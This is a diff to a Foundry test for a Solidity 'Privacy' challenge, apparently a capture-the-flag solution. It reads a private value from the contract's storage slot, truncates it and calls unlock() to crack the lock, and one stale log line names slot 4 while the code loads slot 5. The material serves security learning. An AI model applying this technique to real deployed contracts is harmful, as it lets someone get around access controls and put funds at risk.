@@ -47,22 +47,22 @@ contract PrivacyTest is Test {
         emit log_string("Starting the exploit... 🧨");
         emit log_string("Eve reads the data from the storage slot number 4...");
 
-        bytes32 secondElement = vm.load(
+        bytes32 thirdElement = vm.load(
             address(privacyContract),
             bytes32(uint256(5))
         );
         emit log_named_bytes32(
-            "Second element of the bytes32 array: ",
-            secondElement
+            "Third element of the bytes32 array: ",
+            thirdElement
         );
 
-        bytes16 downcastedSecondElement = bytes16(secondElement);
+        bytes16 downcastedThirdElement = bytes16(thirdElement);
 
         emit log_string(
             "Eve calls the unlock function with the aquired data... 🔑"
         );
 
-        privacyContract.unlock(downcastedSecondElement);
+        privacyContract.unlock(downcastedThirdElement);
 
         emit log_string("Privacy lock cracked... 🔓");
 
